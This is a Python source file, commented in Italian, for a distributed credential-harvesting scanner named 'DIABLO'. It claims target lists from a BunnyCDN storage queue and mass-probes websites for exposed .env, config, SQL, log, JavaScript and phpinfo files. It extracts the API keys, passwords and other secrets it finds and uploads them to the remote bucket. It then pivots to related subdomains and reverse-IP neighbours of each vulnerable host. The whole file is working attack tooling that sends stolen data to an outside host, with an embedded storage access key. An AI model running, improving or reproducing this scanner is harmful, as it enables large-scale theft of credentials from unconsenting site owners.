import os
import sys
import re
import json
import hashlib
import string
import random
import ipaddress
import time
import logging
from pathlib import Path
from typing import List, Dict, Optional, Iterator, Set, Any, Tuple

# Gevent monkey patch DEVE essere il primissimo import prima di requests/grequests
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool

from urllib.parse import urlparse
import warnings
import requests
import grequests
from itertools import islice
import urllib3

# Configurazione Print e Output
ENABLE_VERBOSE_PRINT = False  # Se False, stampa SOLO le vulnerabilità (livello WARNING e superiori)

# Configurazione Logging
log_level = logging.INFO if ENABLE_VERBOSE_PRINT else logging.WARNING

logging.basicConfig(
    level=log_level,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("scanner_bunny_v2.log", encoding="utf-8")
    ]
)
logger = logging.getLogger(__name__)

# Disabilita solo i warning di connessione non sicura (SSL) senza silenziare tutto
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Disabilita i warning di urllib3 per header HTTP malformati (es. Content-Length e Transfer-Encoding insieme)
logging.getLogger("urllib3").setLevel(logging.ERROR)

import http.cookiejar
# Prevenire crash di http.cookiejar su cookie malformati (bug noto in Python 3.12)
original_extract_cookies = http.cookiejar.CookieJar.extract_cookies
def patched_extract_cookies(self, response, request):
    try:
        original_extract_cookies(self, response, request)
    except Exception:
        pass
http.cookiejar.CookieJar.extract_cookies = patched_extract_cookies

# Costanti e Configurazioni
BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
BUNNY_API_KEY = os.getenv("BUNNY_API_KEY", "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc")

RESULT_DIR = Path('DIABLO-LOGV9')
NEW_PATH_EXTRACT = RESULT_DIR / 'DIABLO_FILES_SPLIT'
MYFILE_CHECKT_MOBILE_PRV = RESULT_DIR / 'DIABLO_ENV.txt'
MYFILE_CHECKT_MOBILE_PHP = RESULT_DIR / 'DIABLO_PHPINFO.txt'
MYFILE_CHECKT_MOBILE_PHPS = RESULT_DIR / 'DIABLO_ENV_NEW.txt'
MYFILE_CHECK_XML = RESULT_DIR / 'DIABLO_XML.txt'

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def load_config() -> Dict[str, Any]:
    try:
        config_path = Path('pack.json')
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Errore durante il caricamento di pack.json: {e}")
    return {}

config = load_config()
KEYWORD_REGEX_ENV: List[str] = config.get('APP_REGEX_ENV_SHELL', [])
FILE_ENV_SCAN: List[str] = list(dict.fromkeys(config.get('file_env_shellscan', [])))
FILE_PHP_PROFILE: List[str] = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))

# --- Funzioni Bunny Storage ---

def claim_next_file_from_bunny(site_dir: Path) -> Optional[Path]:
    headers = {"AccessKey": BUNNY_API_KEY, "Accept": "application/json"}
    try:
        url = f"{BUNNY_STORAGE_URL}/site/"
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            files = response.json()
            valid_files = [f for f in files if not f.get("IsDirectory", True) and f.get("ObjectName", "").endswith(".txt")]
            
            if not valid_files:
                return None
                
            random.shuffle(valid_files)
            
            for file_info in valid_files:
                file_name = file_info["ObjectName"]
                file_url = f"{BUNNY_STORAGE_URL}/site/{file_name}"
                
                res = requests.get(file_url, headers=headers, timeout=15)
                if res.status_code == 200:
                    local_path = site_dir / file_name
                    with open(local_path, "wb") as f:
                        f.write(res.content)
                    logger.info(f"[BUNNY CLAIM] ✔️ File scaricato: {file_name}")
                    
                    delete_res = requests.delete(file_url, headers={"AccessKey": BUNNY_API_KEY}, timeout=15)
                    if delete_res.status_code == 200:
                        logger.info(f"[BUNNY CLAIM] 🔒 File rimosso dalla coda remota (Reclamato): {file_name}")
                        
                    return local_path
        else:
            logger.error(f"[BUNNY CLAIM] ❌ Errore Bunny Storage: {response.text}")
    except Exception as e:
        logger.warning(f"[BUNNY CLAIM] ⚠️ Eccezione durante il claim: {str(e)}")
        
    return None

def upload_file_to_bunny(local_path: Path, remote_path: str) -> None:
    headers = {"AccessKey": BUNNY_API_KEY}
    try:
        logger.info(f"[BUNNY UPLOAD] Inizio caricamento del file {local_path} verso {remote_path}...")
        with open(local_path, "rb") as f:
            data = f.read()
        url = f"{BUNNY_STORAGE_URL}/{remote_path}"
        res = requests.put(url, headers=headers, data=data, timeout=30)
        if res.status_code in [200, 201]:
            logger.info(f"[BUNNY UPLOAD] ✔️ Caricato su Bunny: {remote_path}")
        else:
            logger.error(f"[BUNNY UPLOAD] ❌ Errore upload {remote_path}: Status {res.status_code} - {res.text}")
    except Exception as e:
        logger.warning(f"[BUNNY UPLOAD] ⚠️ Eccezione durante l'upload di {remote_path}: {str(e)}")
        error_log = RESULT_DIR / 'ERROR2.txt'
        with open(error_log, 'a', encoding='utf-8') as f:
            f.write(f"Error uploading to Bunny Storage: {str(e)}\n")

def upload_results_to_bunny() -> None:
    logger.info("[BUNNY UPLOAD] Inizio caricamento cartella risultati su Bunny Storage...")
    for file_path in RESULT_DIR.rglob('*'):
        if file_path.is_file():
            rel_path = file_path.relative_to(RESULT_DIR)
            remote_path = f"risultati/{rel_path}".replace("\\", "/")
            upload_file_to_bunny(file_path, remote_path)
    logger.info("[BUNNY UPLOAD] Caricamento risultati completato.")

def delete_file_from_bunny(remote_path: str) -> None:
    headers = {"AccessKey": BUNNY_API_KEY}
    try:
        url = f"{BUNNY_STORAGE_URL}/{remote_path}"
        res = requests.delete(url, headers=headers, timeout=15)
        if res.status_code == 200:
            logger.info(f"[BUNNY DELETE] 🗑️ Eliminato con successo da Bunny: {remote_path}")
        else:
            logger.error(f"[BUNNY DELETE] ❌ Errore eliminazione {remote_path}: Status {res.status_code} - {res.text}")
    except Exception as e:
        logger.warning(f"[BUNNY DELETE] ⚠️ Eccezione durante l'eliminazione di {remote_path}: {str(e)}")
        error_log = RESULT_DIR / 'ERROR2.txt'
        with open(error_log, 'a', encoding='utf-8') as f:
            f.write(f"Error deleting from Bunny Storage: {str(e)}\n")

# --- Helpers ---

def generate_list_env_from_json_multi(site_link: str) -> Iterator[List[str]]:
    base = site_link.rstrip('/')
    for i in range(0, len(FILE_ENV_SCAN), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in FILE_ENV_SCAN[i:i + 100]]

def generate_list_phpprofile_from_json_multi(site_link: str) -> Iterator[List[str]]:
    base = site_link.rstrip('/')
    for i in range(0, len(FILE_PHP_PROFILE), 100):
        yield [f"{base}/{p.lstrip('/')}" for p in FILE_PHP_PROFILE[i:i + 100]]

def chunked_hosts_multi(file_found: Path, chunk_size: int = 50) -> Iterator[List[str]]:
    seen = set()
    unique = []
    try:
        with open(file_found, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url and url not in seen:
                    seen.add(url)
                    unique.append(url)
    except Exception as e:
        logger.error(f"Errore lettura {file_found}: {e}")
        return
    it = iter(unique)
    while True:
        chunk = list(islice(it, chunk_size))
        if not chunk:
            break
        yield chunk

def content_diablo_resp(req: requests.Response) -> str:
    try:
        return req.text
    except UnicodeDecodeError:
        return req.content.decode('utf-8', errors='ignore')

def clean_subdomain(sub: str, domain: str) -> str:
    sub = sub.lower().strip()
    if sub.startswith('*.'):
        sub = sub[2:]
    if sub.startswith('www.'):
        sub = sub[4:]
    return sub

def get_initial_url(url: str) -> str:
    if url.startswith('http://') or url.startswith('https://'):
        return url
    if url.endswith(':443'):
        return f"https://{url}"
    if url.endswith(':80'):
        return f"http://{url}"
    return f"http://{url}"

def get_retry_url(url: str) -> Optional[str]:
    if url.startswith('http://'):
        return url.replace('http://', 'https://', 1)
    if url.startswith('https://'):
        return url.replace('https://', 'http://', 1)
    if url.endswith(':443') or url.endswith(':80'):
        return None
    return f"https://{url}"

def reverse_ip_lookup(ip: str) -> Optional[List[str]]:
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            result = response.text.strip()
            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
                return None
            else:
                aweee = []
                domains = result.split('\n')
                for d in domains:
                    if d.startswith("www."):
                        d = d[4:]
                    aweee.append(d)
                return aweee
    except Exception:
        pass
    return None

def find_subdomains(domain: str) -> Optional[List[str]]:
    subdomains = set()
    try:
        url_ht = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        res_ht = requests.get(url_ht, timeout=10)
        if res_ht.status_code == 200 and "error" not in res_ht.text.lower():
            lines = res_ht.text.strip().split('\n')
            for line in lines:
                sub = line.split(',')[0]
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except Exception:
        pass

    try:
        url_otx = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        res_otx = requests.get(url_otx, timeout=10)
        if res_otx.status_code == 200:
            data = res_otx.json()
            for entry in data.get('passive_dns', []):
                sub = entry.get('hostname', '')
                sub = clean_subdomain(sub, domain)
                if sub.endswith(domain) and sub != domain:
                    subdomains.add(sub)
    except Exception:
        pass

    try:
        url_crt = f"https://crt.sh/?q=%.{domain}&output=json"
        res_crt = requests.get(url_crt, timeout=15)
        if res_crt.status_code == 200:
            data = res_crt.json()
            for entry in data:
                name = entry.get('name_value', '')
                clean_names = name.split('\n')
                for cn in clean_names:
                    cn = clean_subdomain(cn, domain)
                    if cn.endswith(domain) and cn != domain:
                        subdomains.add(cn)
    except Exception:
        pass

    if subdomains:
        aweee = []
        for sub in sorted(subdomains):
            if sub.startswith("www."):
                sub = sub[4:]
            aweee.append(sub)
        return aweee
    return None

# --- Scomposizione Funzioni di Analisi ---

def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
    """Controlla se la risposta indica un 'fake site' (es. wildcard catch-all).
    Ritorna (is_fake, is_valid_url)"""
    try:
        content = r.content
        content_lower = content.lower()
        if b'<pre' in content_lower and b'</pre>' in content_lower:
            return True, False
        if b"popbox.fun" in content_lower:
            return True, False
            
        head = content_lower[:100]
        if b'<html' not in head and b'<!doctype' not in head and b'<body' not in head:
            return False, True
    except Exception:
        pass
    return False, False

def parse_phpinfo(html_content: str) -> Optional[str]:
    """Estrae le variabili PHP da una pagina phpinfo() usando regex (molto più veloce e non blocca gevent)"""
    try:
        match_table = re.search(r'>PHP Variables</h2>(.*?)</table>', html_content, re.IGNORECASE | re.DOTALL)
        if match_table:
            table_content = match_table.group(1)
            formatted_output = ""
            
            rows = re.findall(r'<tr>(.*?)</tr>', table_content, re.IGNORECASE | re.DOTALL)
            for row in rows:
                cols = re.findall(r'<td[^>]*>(.*?)</td>', row, re.IGNORECASE | re.DOTALL)
                if len(cols) >= 2:
                    var_name = re.sub(r'<[^>]+>', '', cols[0]).strip()
                    var_value = re.sub(r'<[^>]+>', '', cols[1]).strip()
                    
                    match = re.search(r"\['([^']+)'\]", var_name)
                    if match:
                        clean_key = match.group(1)
                        formatted_output += f"{clean_key} \t {var_value}\n"
            
            if formatted_output:
                return formatted_output
    except Exception:
        pass
    return None

def validate_regex(contentsx: str, is_php_file: bool, is_html_content: bool, is_env_file: bool) -> bool:
    """Verifica se il contenuto matcha le regex vulnerabili in configurazione."""
    regex_found = False
    for pattern in KEYWORD_REGEX_ENV:
        if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
        if "PHP Version" in pattern and is_env_file: continue
        
        is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
        if is_regex: 
            regex_pattern = pattern
        else:
            escaped = re.escape(pattern)
            start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
            end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
            regex_pattern = f"{start_b}{escaped}{end_b}"
        
        for _ in re.finditer(regex_pattern, contentsx, re.IGNORECASE):
            regex_found = True
            break
        if regex_found: break
    return regex_found

def save_vulnerability_file(file_type: str, response_url: str, contentsx: str, site_link: str, code: str) -> None:
    """Salva il file vulnerabile e lo carica su Bunny."""
    rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    file_base_name = f'DIABLO_{file_type}'
    
    # Scrittura nel file globale aggregato
    global_file = RESULT_DIR / f'{file_base_name}.txt'
    with open(global_file, 'a', encoding='utf-8') as f:
        f.write(f'{response_url}\n{contentsx}\n')
        
    # Scrittura in check file privati
    with open(MYFILE_CHECKT_MOBILE_PRV, 'a', encoding='utf-8') as f:
        f.write(f'{site_link} {code}\n')
        
    # Scrittura del file split
    saved_file_path = NEW_PATH_EXTRACT / f'{file_base_name}_{rnd_suffix}.txt'
    with open(saved_file_path, 'w', encoding='utf-8') as f:
        f.write(f'{response_url}\n{contentsx}\n')
        
    remote_subpath = f"risultati/DIABLO_FILES_SPLIT/{file_base_name}_{rnd_suffix}.txt"
    upload_file_to_bunny(saved_file_path, remote_subpath)

def execute_pivot_search(site_link: str) -> None:
    """Esegue pivot lookup per IP o domini trovati vulnerabili."""
    hostxxx = urlparse(site_link).hostname
    if hostxxx and hostxxx.startswith("www."):
        hostxxx = hostxxx[4:]
    
    is_ip_addr = False
    try:
        ipaddress.ip_address(hostxxx)
        is_ip_addr = True
    except Exception:
        pass
    
    if not is_ip_addr and hostxxx:
        parts = hostxxx.split(".")
        if len(parts) > 2:
            target = ".".join(parts[-2:])
        else:
            target = hostxxx
        
        cazzuno = find_subdomains(target)
        if cazzuno:
            process_urls(cazzuno, is_fallback=True)
        else:
            cazzuno = reverse_ip_lookup(hostxxx)
            if cazzuno:
                process_urls(cazzuno, is_fallback=True)
    elif hostxxx:
        cazzuno = reverse_ip_lookup(hostxxx)
        if cazzuno:
            process_urls(cazzuno, is_fallback=True)

# --- Logica Core Scansione ---

def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fallback: bool = False) -> None:
    try:
        found_env_urls = []
        found_php_urls = []
        checked = 0
        checkeds = 0
        wildcard_strike_count = 0
        fake_for_site = False
        found_for_site = False
        headers_scout = dict(HEADERS)
        
        # 1. Scansione preliminare ENV
        env_batches = site_payloads.get('env', [])
        for batch in env_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
            merdb = grequests.map(reqss, size=50)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checked += 1
                    is_fake, is_valid = check_fake_responses(r)
                    if is_fake:
                        fake_for_site = True
                        r.close()
                        break
                    if is_valid:
                        found_env_urls.append(r.url)
                if r: r.close()
            if checked >= 10 or fake_for_site: return
            
        # 2. Scansione preliminare PHP
        php_batches = site_payloads.get('php', [])
        for batch in php_batches:
            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
            merdb = grequests.map(reqss, size=50)
            for r in merdb:
                if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                    checkeds += 1
                    found_php_urls.append(r.url)
                if r: r.close()
            if checkeds >= 10: return
            
        urls_to_analyze = found_env_urls + found_php_urls
        if not urls_to_analyze: return
        
        seen_content_hashes: Set[str] = set()
        headers_file_probe = dict(HEADERS)
        headers_file_probe['Range'] = 'bytes=0-4096'
        
        # 3. Download approfondito dei target promettenti
        findfile_requests = []
        for url in urls_to_analyze:
            url_lower_check = url.lower()
            is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
            if is_static:
                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
            else:
                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
            findfile_requests.append(req)
            
        responsesf = grequests.map(findfile_requests, size=50)
        unique_responses = {}
        for r in responsesf:
            if r is not None and r.status_code in [200, 206, requests.codes.ok]:
                if r.url not in unique_responses:
                    try:
                        content = r.content
                        url_lower = r.url.lower()
                        content_len = len(content)
                        if content_len < 10 or content_len > 1000000:
                            r.close()
                            continue
                        
                        is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
                        is_debug_page = False
                        if is_html_doc:
                            content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
                            debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
                            if any(k in content_str_head for k in debug_keywords):
                                is_debug_page = True
                        if is_html_doc and not is_debug_page:
                            r.close()
                            continue
                        
                        # Validazione estensioni
                        if b'.env' in url_lower.encode() or any(x in url_lower for x in ['.local', '.remote', '.production', 'config', 'credentials']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.json'):
                            stripped = content.strip()
                            if not (stripped.startswith(b'{') or stripped.startswith(b'[')):
                                r.close()
                                continue
                        elif url_lower.endswith('.xml'):
                            if b'<?xml' not in content[:50] and b'<' not in content[:10]:
                                r.close()
                                continue
                        elif any(url_lower.endswith(x) for x in ['.yml', '.yaml', '.ini', '.conf']):
                            if b'=' not in content and b':' not in content:
                                r.close()
                                continue
                        elif url_lower.endswith('.sql'):
                            content_upper = content[:1000].upper()
                            sql_keys = [b'INSERT INTO', b'CREATE TABLE', b'VALUES', b'SELECT', b'DROP TABLE', b'--']
                            if not any(k in content_upper for k in sql_keys):
                                r.close()
                                continue
                        elif url_lower.endswith('.js'):
                            js_secrets = [b'api_key', b'apikey', b'secret', b'token', b'password', b'credential', b'auth', b'bearer', b'db_']
                            if not any(k in content.lower() for k in js_secrets):
                                r.close()
                                continue
                        elif url_lower.endswith('.log'):
                            log_keys = [b'[202', b'[error]', b'[info]', b'[debug]', b'[warning]']
                            if not any(k in content.lower() for k in log_keys):
                                r.close()
                                continue
                                
                        # Gestione wildcard hash
                        content_hash = hashlib.md5(content).hexdigest()
                        if content_hash in seen_content_hashes:
                            wildcard_strike_count += 1
                            r.close()
                            if wildcard_strike_count >= 5:
                                fake_for_site = True
                                break
                            continue
                        seen_content_hashes.add(content_hash)
                        unique_responses[r.url] = r
                    except Exception:
                        r.close()
                else: r.close()
            else:
                if r: r.close()
                
        if fake_for_site: return
        
        # 4. Validazione finale ed estrazione vulnerabilità
        valid_responzzz = list(unique_responses.values())
        if valid_responzzz:
            for r in valid_responzzz:
                if r is None: continue
                try:
                    contentsx = content_diablo_resp(r)
                except Exception:
                    r.close()
                    continue
                response_url = r.url
                
                url_lower = response_url.lower()
                is_env_file = any(x in url_lower for x in ['.env', '.ini', '.conf', 'config', '.txt', '.local', '.remote', '.production', '.yml', '.yaml', '.bak', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
                is_json_file = url_lower.endswith('.json')
                is_php_file = any(x in url_lower for x in ['.php', 'phpinfo', 'view', '_profiler', 'info', '.cgi', '.sh', '.py', '.rb'])
                is_html_content = "<html>" in contentsx.lower() or "<!doctype" in contentsx.lower()
                
                if is_json_file:
                    try:
                        json_content_dict = json.loads(contentsx)
                        with open(RESULT_DIR / 'DIABLO_JSON.txt', 'a', encoding='utf-8') as f:
                            f.write(f'{json_content_dict}\n')
                    except Exception: pass
                    
                regex_found = validate_regex(contentsx, is_php_file, is_html_content, is_env_file)
                    
                if regex_found:
                    if not is_html_content:
                        logger.warning(f"    [!] 🔥 VULNERABILITA' TROVATA (Regex): {response_url}")
                        found_for_site = True
                        
                        if is_json_file: save_vulnerability_file('JSON', response_url, contentsx, site_link, '1')
                        elif is_env_file: save_vulnerability_file('ENV_NEW', response_url, contentsx, site_link, '2')
                        elif url_lower.endswith('.js'): save_vulnerability_file('JS', response_url, contentsx, site_link, '3')
                        elif url_lower.endswith('.xml'): save_vulnerability_file('XML', response_url, contentsx, site_link, '4')
                        elif url_lower.endswith('.log'): save_vulnerability_file('LOG', response_url, contentsx, site_link, '5')
                        elif url_lower.endswith('.sql'): save_vulnerability_file('SQL', response_url, contentsx, site_link, '6')
                        else: save_vulnerability_file('OTHER', response_url, contentsx, site_link, '7')
                            
                    formatted_phpinfo = parse_phpinfo(r.text)
                    if formatted_phpinfo:
                        logger.warning(f"    [!] 🐘 TROVATO PHPINFO: {response_url}")
                        found_for_site = True
                        rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                        
                        with open(MYFILE_CHECKT_MOBILE_PHP, 'a', encoding='utf-8') as f: 
                            f.write(f'{response_url}\n{formatted_phpinfo}\n')
                        with open(MYFILE_CHECKT_MOBILE_PRV, 'a', encoding='utf-8') as f: 
                            f.write(f'{site_link} 8\n')
                        
                        saved_php_path = NEW_PATH_EXTRACT / f'DIABLO_PHPINFO_{rnd_suffix_php}.txt'
                        with open(saved_php_path, 'w', encoding='utf-8') as f: 
                            f.write(f'{response_url}\n{formatted_phpinfo}\n')
                        
                        upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
                        
                try: r.close()
                except Exception: pass
                
                if fake_for_site or found_for_site: break
                
        # 5. Esegui Pivot Se Vulnerabilità Trovata
        if found_for_site and not is_fallback:
            execute_pivot_search(site_link)
                
    except Exception as e:
        error_log = RESULT_DIR / 'ERROR2.txt'
        with open(error_log, 'a', encoding='utf-8') as f: 
            f.write(str(e) + '\n')

def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False) -> None:
    """Funzione comune per testare la connettività di un blocco di URL e avviare la scansione sui target vivi."""
    logger.info(f"[SCANNER] Controllo blocco di {len(urls_list)} target...")
    try:
        resp_site = [
            grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
            for url in urls_list
        ]
        merdb = grequests.map(resp_site, size=50)
        hosts_by_site = {}
        for r in merdb:
            if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                site_url = r.url
                if site_url not in hosts_by_site:
                    hosts_by_site[site_url] = {
                        'env': list(generate_list_env_from_json_multi(site_url)),
                        'php': list(generate_list_phpprofile_from_json_multi(site_url))
                    }
            if r: r.close()
            
        retry_urls = []
        for i, r in enumerate(merdb):
            if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206]):
                retry_u = get_retry_url(urls_list[i])
                if retry_u:
                    retry_urls.append(retry_u)
                    
        if retry_urls:
            logger.info(f"[SCANNER] Retry su {len(retry_urls)} target con protocollo alternativo...")
        resp_retry = [
            grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
            for url in retry_urls
        ]
        retry_responses = grequests.map(resp_retry, size=50)
        for r in retry_responses:
            if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
                site_url = r.url
                if site_url not in hosts_by_site:
                    hosts_by_site[site_url] = {
                        'env': list(generate_list_env_from_json_multi(site_url)),
                        'php': list(generate_list_phpprofile_from_json_multi(site_url))
                    }
            if r: r.close()
            
        site_pool = Pool(100)
        jobs = []
        for site_link, site_payloads in hosts_by_site.items():
            logger.info(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}")
            jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
        site_pool.join()
            
    except Exception as e:
        error_log = RESULT_DIR / 'ERROR2.txt'
        with open(error_log, 'a', encoding='utf-8') as f:
            f.write(f"Errore in check_connectivity_and_scan: {str(e)}\n")

def process_urls(urls_list: List[str], is_fallback: bool = False) -> None:
    it = iter(urls_list)
    logger.info(f"\n[SCANNER] 🚀 Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...")
    while True:
        chunk = list(islice(it, 200))
        if not chunk:
            break
        check_connectivity_and_scan(chunk, is_fallback)

def process_file(file_path: Path) -> None:
    logger.info(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_path.name}")
    for cameras in chunked_hosts_multi(file_path, chunk_size=200):
        check_connectivity_and_scan(cameras, is_fallback=False)
                
    logger.info(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_path.name}")
    try:
        file_path.unlink()
        logger.info(f"[SYSTEM] File locale eliminato: {file_path}")
    except Exception as e:
        logger.error(f"[SYSTEM] Errore eliminazione locale {file_path}: {e}")

def main() -> None:
    logger.info("\n[SYSTEM] 🛡️ Inizializzazione scanner DIABLO in modalità CLOUD WORKER...")
    RESULT_DIR.mkdir(parents=True, exist_ok=True)
    NEW_PATH_EXTRACT.mkdir(parents=True, exist_ok=True)
    
    site_dir = Path('site')
    site_dir.mkdir(parents=True, exist_ok=True)
        
    while True:
        try:
            txt_file = claim_next_file_from_bunny(site_dir)
            
            if txt_file:
                process_file(txt_file)
                
                logger.info("\n[SYSTEM] 📦 Scansione file terminata. Avvio caricamento risultati generali incrementali...")
                upload_results_to_bunny()
                logger.info("[SYSTEM] ✅ Risultati caricati con successo.")
            else:
                logger.info("\n[SYSTEM] 💤 Nessun file in coda su Bunny. In attesa di nuovi target...")
                time.sleep(60)
        except KeyboardInterrupt:
            logger.info("\n[SYSTEM] Interruzione manuale ricevuta. Chiusura in corso...")
            break
        except Exception as e:
            logger.error(f"[SYSTEM] Errore critico nel ciclo principale: {e}")
            time.sleep(10)

if __name__ == '__main__':
    main()
